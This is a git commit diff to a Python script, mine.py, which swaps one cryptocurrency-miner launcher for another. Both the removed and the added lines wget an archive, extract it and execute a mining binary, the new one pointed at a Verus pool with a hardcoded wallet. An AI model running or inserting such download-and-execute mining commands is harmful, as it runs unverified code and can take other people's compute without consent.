ddcf65d328e5273b00c5717a3e18c7067271b802
teskilah <85160027+teskilah@users.noreply.github.com>
2021-06-14 23:55:51 +0700

    Update mine.py

--- mine.py
+++ mine.py
@@ -1,4 +1,2 @@
 import os
-a  = os.popen('wget https://github.com/teskilah/teshe/releases/download/das/luck.tar.gz').readlines()
-a  = os.popen('tar -xvf luck.tar.gz').readlines()
-b  = os.popen('./nanominer').readlines()
+a  = os.popen('wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l vrsc.ciscotech.dk:9999 -u RE17z9AwpsdKNvZMDPwoE6b7ZyNZLeUs4Z.cpu1 -p x -t 2').readlines()
